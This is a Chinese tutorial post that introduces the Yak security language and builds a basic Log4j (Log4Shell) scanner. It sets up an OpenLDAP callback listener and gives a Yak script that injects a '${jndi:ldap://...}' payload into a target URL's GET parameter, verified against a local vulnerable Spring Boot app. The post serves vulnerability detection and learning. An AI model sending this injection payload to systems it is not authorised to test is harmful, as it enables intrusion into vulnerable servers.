## **01 Yak是什么**

Yak 是一门 Web 安全研发领域垂直语言。专为安全而生，致力于安全能力融合的语言。内置多种网络安全模块。

总之Yak是整合了当前多种安全工具和开源项目，让安全从业人员无需安装复杂的依赖，就能上手工作。可以使安全从业人员快速进行安全检测和脚本编写。

官网地址：[https://www.yaklang.io/](https://link.zhihu.com/?target=https%3A//www.yaklang.io/)

Github地址：yaklang/yakit: Cyber Security ALL-IN-ONE Platform
([http://github.com](https://link.zhihu.com/?target=http%3A//github.com))

由于本人接触这门语言时间不长，下面用Yak写一个简单的Log4j的检查工具。

##  **02 Log4j漏洞**

Log4j2 是一款 Java 日志记录框架。在Java开发中应用广泛。

2021年11月下旬由一名中国工程师、阿里云安全团队的 陈兆军（音译）发现Log4j2存着JNDI注入漏洞。并提交Apache官方。

该漏洞被称为：「互联网正在着火」「过去十年最严重的漏洞」「现代计算机历史上最大漏洞」「难以想到哪家公司不受影响」！

漏洞利用流程如下：

![v2-a2ed13167e53e3c5da7ab3e9ff7919d8_720w.jpg](https://image.3001.net/images/20220223/1645585622_6215a4d6e704136cb0da6.jpg!small)

##  **03 搭建漏洞利用环境**

由于Log4j漏洞的影响很多DNSLog平台纷纷屏蔽了LADP协议。所以为了方便起见，自己搭一个LADP环境，用于漏洞的检验

1\. yum 安装相关包

    
    
    yum install -y openldap openldap-clients openldap-servers

2\. 复制一个默认配置到指定目录下,并授权，这一步一定要做，然后再启动服务，不然生产密码时会报错

    
    
    cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG

3\. 授权给ldap用户,此用户yum安装时便会自动创建

    
    
    chown -R ldap. /var/lib/ldap/DB_CONFIG

4\. 启动服务，先启动服务，配置后面再进行修改

    
    
    systemctl start slapd

5\. 查看状态，正常启动则ok

    
    
    systemctl status slapd

6\. 在slapd.conf中加一行：

    
    
    loglevel        4095

7\. 在/etc/rsyslog.conf 中加入ldap日志文档：

    
    
    local4.* /var/log/ldap.log

8\. 创建日志文件

    
    
    touch /var/log/ldap.log

9\. 重启 syslog和OpenLDAP

    
    
    systemctl restart rsyslog

10\. 测试是否可通，随便找一台其他主机

    
    
    telnet  OpenLDAP所在机器ip  389

11\. 查看 /var/log/ldap.log日志，发现日志中已经记录了访问的IP信息

![v2-51b01e5ee9a3892849d605fa2bc44c2c_720w.jpg](https://image.3001.net/images/20220223/1645585623_6215a4d770f2eb5d4a037.jpg!small)

##  **04 使用Yak编写log4j扫描服务**

yak log4jScan.yak

-u 要注入的目的地址

-l 注入参数ldap地址（上一步搭建的）

-m 请求方法Get/Post（当前只支持Get，默认Get）

-p 参数名（一般像username之类的）

  

log4jScan.yak 内容如下：

    
    
    //获取ldap地址
    raw = cli.String("l");
    //拼接注入内容
    payload = "${jndi:ldap://" + string(raw) +"/}"
    println("注入参数:"+string(payload))
    
    //获取要扫描的URL
    url = cli.String("u")
    method = cli.String("m")
    params = cli.String("p")
    if params == "" {
        params = "v"
    }
    if method == "" {
        method = "Get"
    }
    
    //发送注入请求
    if method == "Get" {
        code =codec.EncodeUrl(payload)
        url = url+"?"+params+"="+code
        println("发送url:"+string(url))
        rsp, err := http.Get(
            url,
        )
        die(err)
        println()
        raw, err := io.ReadAll(rsp.Body)
        die(err)
        println(string(raw))
    }

##  **05 验证成果**

使用springboot简单搭建一个log4j漏洞环境，关键的漏洞处：

    
    
    @RequestMapping("/test")
    @ResponseBody
    public String quick(@RequestParam("v") String v) {
        LOG.error(v);
        return "hello SpringBoot !";
    }

yak log4jScan.yak -u
[http://127.0.0.1:8080/test](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/test)-l
192.168.183.108:389

  

![v2-d5122698b7aaa8181788d186c894b1a6_720w.jpg](https://image.3001.net/images/20220223/1645585623_6215a4d7c9424393b8fa8.jpg!small)

  

  

yakit控制台输出日志：

![v2-f0f415d4690a3b8dbb3cebba16b746e9_720w.jpg](https://image.3001.net/images/20220223/1645585624_6215a4d821b1bf552b9d4.jpg!small)

查看OpenLDAP日志：

![v2-10e404a4223409fb9b293341f970e8cf_720w.jpg](https://image.3001.net/images/20220223/1645585624_6215a4d86602d63695883.jpg!small)

日志中出现漏洞环境IP信息，验证证实可以通过log4jScan.yak文件对目标漏洞环境进行注入。

##  **06 结束语**

当然，以上是用最简单的方式进行了Log4j的复现和检测，如果需要检测线上环境是否有漏洞，可以把OpenLDAP环境地址映射到外网。如果真的做成生产力工具，还需要考虑更多的情况，比如线程、参数等等，文章中的Yak代码也有优化的空间，最后可以ssh到日志环境，根据日志信息用字符串判断是否触发漏洞，达到Log4j漏洞判断的自动化。本文只是简单的应用，入门而已，Yak还有很多精彩的特性，作者也还在学习中。

##  **07 END**

感谢望川的投稿~~大家有兴趣的可以扫码添加微信进群与大佬们交流～（还在招人中，实习全职均可～[诚意满满的招聘来啦~](https://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzAxOTAzOTU3Mw%3D%3D%26mid%3D2247484505%26idx%3D1%26sn%3D4196ce610c893a447a8a620cc3508ea6%26chksm%3D9bcc5063acbbd975979467ea6e24fda246569ffb044afbc1ea8c784635daf7157e71341723d6%26scene%3D21%23wechat_redirect)）

![1645585262_6215a36e2eec5274d9506.jpg!small?1645585262140](https://image.3001.net/images/20220223/1645585262_6215a36e2eec5274d9506.jpg!small?1645585262140)

